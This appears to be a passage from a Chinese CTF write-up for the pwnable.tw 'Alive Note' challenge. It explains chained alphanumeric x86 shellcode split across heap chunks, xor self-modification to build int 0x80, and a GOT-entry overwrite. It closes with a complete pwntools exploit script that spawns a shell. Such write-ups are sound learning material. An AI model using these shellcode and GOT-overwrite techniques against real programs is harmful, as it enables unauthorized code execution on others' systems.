    push 0x7a
    pop edx
    push ebx
    jne 0x3a #因为跳到0x38处，要减去2，指令长度为2
发觉jne的0x不好选，因为题目有限制，看限制
**顺序: 1- >5->2->6->4**
    ['0x0', '0x20', '0x30', '0x31', '0x32', '0x33', '0x34', '0x35', '0x36', '0x37', '0x38', '0x39', '0x41', '0x42', '0x43', '0x44', '0x45', '0x46', '0x47', '0x48', '0x49', '0x4a', '0x4b', '0x4c', '0x4d', '0x4e', '0x4f', '0x50', '0x51', '0x52', '0x53', '0x54', '0x55', '0x56', '0x57', '0x58', '0x59', '0x5a', '0x61', '0x62', '0x63', '0x64', '0x65', '0x66', '0x67', '0x68', '0x69', '0x6a', '0x6b', '0x6c', '0x6d', '0x6e', '0x6f', '0x70', '0x71', '0x72', '0x73', '0x74', '0x75', '0x76', '0x77', '0x78', '0x79', '0x7a']
所以我们选的常数要在这个范围里面，0x7a就是因为他是最大的，所以我们就选了edx为0x7a,最好选的就是0x38左右，为什么，我第一个shellcode长度为8
    0x0:    0x00000000  0x00000011  0x31000000  0x00000000 #堆块1完成
    0x10:   0x00000000  0x00000011  0x32000000  0x00000000
    0x20:   0x00000000  0x00000011  0x33000000  0x00000000
    0x30:   0x00000000  0x00000011  0x34000000  0x00000000
    0x40:   0x00000000  0x00000011  0x35000000  0x00000000 #堆块5完成
    0x50:   0x00000000  0x00000011  0x36000000  0x00000000
以这个为例子就是填充到0x10处,所以最小的限制字符就是0x30开头了，那就跳到0x48处,  
jne跳转计算为0x48-0x10=0x38,所以第一个跳就是jne 0x3a,因为要-2,这个机器码对应的才是跳0x38
  1. 我跳转到了第5块堆块，然后又要跳回来的话，就要设置大于0x80大小的值(因为0x80前是正数，0x80后才是负数),所以有
    >>> hex(0x18-0x4d & 0xff)
    '0xcb'
所以jne 0xcb是我们想要的结果，然后这个对应的机器码为75C9，其实0xcb可以不用计算器算，用 **吾爱工具跳转指令计算器0.4b**
计算的我是，找了好久才用他，输入0x4d和0x18 就出来了，接下来将C9转换成可见字符，
xor byte ptr[ecx+0x46]
    >>> hex(0x4e-0x8)
    '0x46'
是0x46,这里就是计算那个偏移了ecx是堆块0，然后偏移
    pop eax
    dec eax #eax变为0xffffffff
    xor byte ptr[ecx+0x46],al #合起来5个字节 0x46上面刚计算
    jne 0xcb # 这里是75C9,转变C9与0xff异或为0x36所以最终为7536
    0x0:    0x00000000  0x00000011  0x31000000  0x00000000 #1完成
    0x10:   0x00000000  0x00000011  0x32000000  0x00000000
    0x20:   0x00000000  0x00000011  0x33000000  0x00000000
    0x30:   0x00000000  0x00000011  0x34000000  0x00000000
    0x40:   0x00000000  0x00000011  0x35000000  0x00000000 #5完成
    0x50:   0x00000000  0x00000011  0x36000000  0x00000000
  1. 接下来本应该是第2块堆块了
参数已经设置好了，现在最主要要构造int 0x80了，所以就是xor变成int 0x80
我们将int 0x80放在最后一个执行的堆块里，就是第4块堆块，所以还是得先设置第四块
  1. 设置第四块
参数还要设置eax为0x3,所以先将eax变为0，
    pop eax
    xor al,0x33
    xor al,0x30 #5个字节
    int 0x80 #本来是\xcd\x80，两个都不可见，所以要将其变为可见，回到第二块堆块
    0x0:    0x00000000  0x00000011  0x31000000  0x00000000 #1完成
    0x10:   0x00000000  0x00000011  0x32000000  0x00000000
    0x20:   0x00000000  0x00000011  0x33000000  0x00000000
    0x30:   0x00000000  0x00000011  0x34000000  0x00000000 #4完成
    0x40:   0x00000000  0x00000011  0x35000000  0x00000000 #5完成
    0x50:   0x00000000  0x00000011  0x36000000  0x00000000
  1. 再次回到第二块堆块
    xor al,0x46 #al=0xb9
    xor byte ptr[ecx+0x35],al 
    push ebx #为第四块的pop eax做准备
    jne 0x3a #同理跳到第六块去
    pop eax
    xor al,0x33
    xor al,0x30 #5个字节
    int 0x80 #现在变成\x74\x80
    0x0:    0x00000000  0x00000011  0x31000000  0x00000000 #1完成
    0x10:   0x00000000  0x00000011  0x32000000  0x00000000 #2完成
    0x20:   0x00000000  0x00000011  0x33000000  0x00000000
    0x30:   0x00000000  0x00000011  0x34000000  0x00000000 #4完成
    0x40:   0x00000000  0x00000011  0x35000000  0x00000000 #5完成
    0x50:   0x00000000  0x00000011  0x36000000  0x00000000
  1. 第六块堆块了
先将堆块4改了
    xor byte ptr[ecx+0x36],al  #int 0x80设置好了,3个字节
    xor byte ptr[ecx+0x57],al      # 在三个字节，将d8转化 0x5f-0x8
    jne 0xda #0x5e跳到0x38, 原机器码75d8,d8转为61,所以变为7561
    pop eax
    xor al,0x33
    xor al,0x30 #5个字节
    int 0x80 #现在变成\x74\x39
    >>> hex(0xb9^0x80)
    '0x39'
    0x0:    0x00000000  0x00000011  0x31000000  0x00000000 #1完成
    0x10:   0x00000000  0x00000011  0x32000000  0x00000000 #2完成
    0x20:   0x00000000  0x00000011  0x33000000  0x00000000 #3随便填充就好
    0x30:   0x00000000  0x00000011  0x34000000  0x00000000 #4完成
    0x40:   0x00000000  0x00000011  0x35000000  0x00000000 #5完成
    0x50:   0x00000000  0x00000011  0x36000000  0x00000000 #6完成
  1. 将这些汇编代码转为可见字符，这里我用ollydbg加跳转指令计算器
第一段:
    >>> p64(0x3875535a7a6a5950)
    'PYjzZSu8'
PYjzZSu8
第二段:
    >>> p64(0x3875533541304634)
    '4F0A5Su8'
4F0A5Su8
第三段: 随便
第四段:
    >>> p64(0x39743034333458)
    'X4340t9\x00'
X4340t9
第五段:
    >>> p64(0x36754641304858)
    'XH0AFu6\x00'
XH0AFu6
第六段:
    >>> p64(0x6175574130364130)
    '0A60AWua'
PYjzZSu8  
4F0A5Su8  
11111111  
X4340t9  
XH0AFu6  
0A60AWua
  1. 做完这些过后，填充前面的，然后shellcode就行，位置0x38+7-0x8=0x37
所以就是’a'*0x37 + asm(shellcraft.sh())
#### 执行过程
至于执行过程呢，free(offset),然后就开始执行free_got表里的shellcode，也就是offset处的shellcode，接着跳来跳去就完成了
还有就是没必要跟我一样挑难的来，网上好多大佬都是中间用三个堆块填充，这样跳转不用计算来计算去，那样好算点，我是为了复习汇编加理解原理搞复杂的
#### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from pwn import *
    local = 1
    host = '127.0.0.1' 
    port = 10000
    #context.log_level = 'debug'
    exe = './alive_note'
    # Load it if has exe
    try:
        context.binary = exe
        elf = ELF(exe)
    except Exception as e:
        print("Elf can't be load")
    # load libc 
    libc = elf.libc if context.binary else ELF("./libc.so.6")
    if local:
        io = process(exe)
    else:
        io = remote(host,port, timeout=10)
    #don't forget to change it
    s    = lambda data                                    : io.send(str(data))
    sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
    sl   = lambda data                                    : io.sendline(str(data))
    sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
    r    = lambda numb=4096                               : io.recv(numb)
    rl   = lambda                                         : io.recvline()
    ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
    rg   = lambda regex                                   : io.recvregex(regex)
    rp   = lambda timeout=1                               : io.recvrepeat(timeout)
    uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
    uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
    lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
    ia   = lambda                                         : io.interactive()
    # break on aim addr
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
            ga('b *{}'.format(hex(text_base+addr)))
        else:
            ga("b *{}".format(hex(addr)))
    # get_one_gadget
    def get_one_gadget(filename):
        return map(int, os.popen("one_gadget --raw " + filename).readlines()[0].split(' '))
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
        # Arch:     i386-32-little
        # RELRO:    Partial RELRO
        # Stack:    Canary found
        # NX:       NX disabled
        # PIE:      No PIE (0x8048000)
        # RWX:      Has RWX segments
    def fuzz(char):
        new(0, char)
        show(0)
        print(rl())
    List = [0, 32, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122]         
    List = [chr(i) for i in List]
    def checkPayload(payload):
        for i in payload:
            if i in List:
                return False
        return True
    def c(idx):
        sla(":", idx)
    def new(idx, name):
        c(1)
        sla(":", idx)
        if checkPayload(name):
            print("payload is wrong")
            exit(0)
        else:
            sla(":", name)
    def show(idx):
        c(2)
        sla(":", idx)
    def delete(idx):
        c(3)
        sla(":", idx)
    def exp(host, rce=False):
        if rce:
            one_gadget = get_one_gadget(libc.path)
        #start here
        '''
        PYjzZSu8
        4F0A5Su8
        11111111
        X4340t9
        XH0AFu6
        0A60AWua
        '''
        # offset = free_got - heap
        offset = (0x0804a014-0x0804A080)/4
        ga("b *0x080488DC\n c\nn 4\ndelete\ns\n")
        new(offset, 'PYjzZSu8')
        new(0, '4F0A5Su8')
        new(1, '11111111')
        new(2, 'X4340t9')
        new(3, 'XH0AFu6')
        new(4, '0A60AWua')
        delete(offset)
        s(0x37*'a' + asm(shellcraft.sh()))
        #ga()
        ia()
    if __name__ == '__main__':
        # fuzz the input name
        '''
        List = []
        for i in range(0, 128):
            try:
                fuzz(chr(i))
                io.close()
                List.append(i)
            except Exception as e:
                print(e)
            finally:
                io = process(exe)
        print(List)
        '''
        exp(host,)
## 总结
  1. shellcode编写难度其实还是挺大的，最主要是数学计算问题，计算偏移跳转那些确实得非常精细
  2. shellcode题目类型其实也不多，手写的难度大，在菜鸡比赛中应该比较少出现，大部分是那种工具生成的，毕竟手写汇编太耗时了?(师傅们几分钟写完，我等瑟瑟发抖)
  3. shellcode链这种思路我还没编写过，这次学到了，大佬们tql
  4. xor byte ptr[ecx+0x35],al 这种改int 0x80也是刚学到
## 参考链接
[DoubleLabyrinth师傅](https://github.com/DoubleLabyrinth/pwnable.tw/blob/master/Alive%20Note/solve.py)  
[p4nda师傅的博客(听过师傅好久了，没机会认识)](http://p4nda.top/2018/05/13/ciscn-ctf-2018/)